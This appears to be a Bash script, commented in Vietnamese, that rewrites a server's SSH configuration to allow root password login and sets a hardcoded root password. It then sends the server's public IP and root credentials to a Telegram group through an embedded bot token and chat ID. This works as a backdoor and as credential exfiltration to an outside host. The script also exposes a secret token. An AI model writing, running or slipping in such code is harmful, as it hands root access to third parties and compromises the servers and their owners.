#!/bin/bash

# Xóa file sshd_config cũ
rm -f /etc/ssh/sshd_config

# Tạo lại file sshd_config
cat <<EOF > /etc/ssh/sshd_config
Port 22
PermitRootLogin yes
PasswordAuthentication yes
ChallengeResponseAuthentication no
UsePAM yes
Subsystem sftp /usr/lib/openssh/sftp-server
EOF

# Đặt mật khẩu root
PASS="Avengerendgame123@"
echo "root:$PASS" | chpasswd

# Restart SSH để áp dụng cấu hình
systemctl restart ssh
systemctl restart sshd

# Lấy IP public
IP=$(curl -s ifconfig.me)

# Gửi thông tin về Telegram nhóm
BOT_TOKEN="7661562599:AAG5AvXpwl87M5up34-nj9AvMiJu-jYuWlA"
CHAT_ID="-4691961289"

MESSAGE="🛡️ SSH VPS Ready!
🌐 IP: $IP
👤 User: root
🔑 Pass: $PASS

📥 HDSD:
ssh root@$IP"

curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
-d chat_id="$CHAT_ID" \
-d text="$MESSAGE"
